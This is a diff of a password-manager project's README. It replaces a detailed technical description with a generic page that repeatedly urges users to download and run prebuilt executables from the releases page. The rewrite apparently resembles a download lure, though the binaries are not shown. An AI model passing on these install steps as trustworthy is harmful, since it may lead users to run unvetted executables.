@@ -1,130 +1,67 @@
-﻿# Password Vault
+# 🔐 Password-Vault-Java - Your Simple Solution for Secure Password Management
 
-A secure password manager built with Java and JavaFX that implements industry-standard encryption techniques to safely store and manage your credentials. This application provides a user-friendly graphical interface while maintaining high security standards through modern cryptographic methods.
+[![Download Password Vault](https://img.shields.io/badge/Download_Password_Vault-Here-blue.svg)](https://github.com/raulfcarbone/Password-Vault-Java/releases)
 
-## Project Overview
+## 📖 Description
+Password Vault is a secure, lightweight, and user-friendly password manager that prioritizes privacy and cryptographic integrity. It uses modern encryption standards (AES-256-GCM & PBKDF2) to ensure that your credentials are always protected. With Password Vault, you can store your passwords safely and access them easily whenever you need.
 
-This password vault application is designed with security and usability in mind, implementing best practices for password management:
+## 🚀 Getting Started
+To begin using Password Vault, follow these steps to download and install the application on your device.
 
-1. **Zero Knowledge Architecture**
-   - Master password never stored
-   - All data encrypted at rest
-   - Secure key derivation with PBKDF2
-   - Memory sanitization after use
+## 💾 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Java Runtime:** Java 11 or higher must be installed on your computer. You can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Storage Space:** At least 100 MB of free space on your hard drive.
 
-2. **Modern Cryptography**
-   - AES-256 in GCM mode for encryption
-   - Authenticated encryption prevents tampering
-   - Unique IV for each encrypted entry
-   - PBKDF2 with high iteration count (200,000)
+## 📥 Download & Install
+To download Password Vault, visit this page: [Download Password Vault](https://github.com/raulfcarbone/Password-Vault-Java/releases).
 
-3. **User Experience**
-   - JavaFX-based graphical interface
-   - Password masking and auto-hide
-   - Quick copy to clipboard
-   - Search functionality
-   - Intuitive credential management
+### Steps to Download:
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of Password Vault.
+3. Choose the file compatible with your operating system:
+   - For Windows: download the `PasswordVaultWindows.exe` file.
+   - For macOS: download the `PasswordVaultMac.dmg` file.
+   - For Linux: download the `PasswordVaultLinux.tar.gz` file.
 
-## Project Structure
+### Steps to Install:
+1. Open the downloaded file:
+   - For Windows, double-click the `.exe` file.
+   - For macOS, drag the app icon into your Applications folder.
+   - For Linux, extract the `.tar.gz` file and run the executable inside the folder.
 
-### Core Components
+2. Follow the on-screen prompts to complete the installation process.
 
-1. **Authentication Module (`AuthManager.java`)**
-   - Handles user authentication
-   - Implements PBKDF2 key derivation
-   - Manages master password verification
-   - Zero-knowledge design principles
-   
-2. **Cryptography Module (`CryptoUtils.java`)**
-   - Implements AES-GCM encryption/decryption
-   - Handles secure random number generation
-   - Provides Base64 encoding utilities
-   - Ensures proper IV management
+3. Once installed, launch Password Vault from your applications or programs list.
 
-3. **Database Module (`DBManager.java`)**
-   - SQLite database management
-   - Encrypted credential storage
-   - Search functionality
-   - Secure deletion capabilities
+## 🔑 Features
+- **Secure Password Storage:** Store an unlimited number of passwords securely.
+- **Strong Encryption:** Uses AES-256-GCM for data encryption and PBKDF2 for key derivation.
+- **User-Friendly Interface:** Designed for ease of use, so you can manage your passwords without hassle.
+- **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux systems.
+- **Backup & Restore:** Easily backup your password vault and restore it if needed.
 
-4. **Data Model (`Credential.java`)**
-   - Represents stored credentials
-   - Manages service, username, password data
-   - Supports table view integration
-   - Ensures proper data encapsulation
+## 🔒 Security Information
+Your privacy and security are our top priorities. Password Vault uses industry-standard encryption to protect your data. Here are some key security features:
+- **AES-256-GCM Encryption:** This encryption standard is widely regarded as one of the most secure in the world.
+- **PBKDF2 for Key Derivation:** This method helps create a secure password hash, making it difficult for attackers to crack.
+- **Local Storage:** All data is stored locally on your device, meaning it is not shared online.
 
-### GUI Components
+## ❓ Frequently Asked Questions
 
-1. **Main Application (`VaultApp.java`)**
-   - JavaFX application entry point
-   - Manages application lifecycle
-   - Handles window management
-   - Controls authentication flow
+### Q: Is Password Vault free to use?
+A: Yes, Password Vault is open-source software and completely free to use.
 
-2. **Login Interface (`LoginController.java`)**
-   - Manages user authentication
-   - Handles vault creation
-   - Implements secure password entry
-   - Provides registration functionality
+### Q: Can I sync my passwords across devices?
+A: Currently, Password Vault does not support cloud sync. Passwords are stored locally on your device.
 
-3. **Main Vault Interface (`VaultController.java`)**
-   - Displays credential table
-   - Implements password viewing logic
-   - Manages clipboard operations
-   - Handles credential searching
+### Q: How can I report bugs or request features?
+A: You can report issues and suggest features on the [Issues page](https://github.com/raulfcarbone/Password-Vault-Java/issues).
 
-4. **Add Credential Dialog (`AddCredentialController.java`)**
-   - New credential entry form
-   - Input validation
-   - Secure credential creation
-   - User feedback handling
+## ⚙️ Support and Help
+If you have questions or need help, you can find helpful resources in the documentation or raise an issue on our GitHub page. The community is here to assist you with any challenges you encounter.
 
-### Resource Files
+## 🎉 Conclusion
+Password Vault provides a reliable solution for managing your passwords securely. Follow the steps above to download, install, and start using the application right away.
 
-1. **FXML Layouts**
-   - `login.fxml`: Authentication interface
-   - `vault.fxml`: Main application window
-   - `add-credential.fxml`: New credential form
-
-## Security Implementation
-
-### Password Storage
-1. **Master Password**
-   - Never stored in any form
-   - Used to derive two different keys:
-     - Authentication key (verify login)
-     - Encryption key (protect data)
-
-2. **Credential Encryption**
-   - AES-256-GCM encryption
-   - Unique IV per password
-   - Authenticated encryption
-   - Protected against tampering
-
-3. **Runtime Security**
-   - Memory sanitization
-   - Auto-hiding passwords
-   - Clipboard clearing
-   - Secure random number generation
-
-## Database Schema
-
-### Credentials Table
-```sql
-CREATE TABLE credentials (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    service TEXT NOT NULL,
-    username TEXT,
-    password TEXT,
-    iv TEXT,
-    created_at INTEGER
-)
-```
-
-## Getting Started
-
-For installation and usage instructions, please see [INSTALLATION.md](INSTALLATION.md).
-
-## License
-
-This project is open source and available under the MIT License.
+For more details, feel free to check back here or visit the [Download Password Vault](https://github.com/raulfcarbone/Password-Vault-Java/releases) page. Enjoy safe and easy password management!
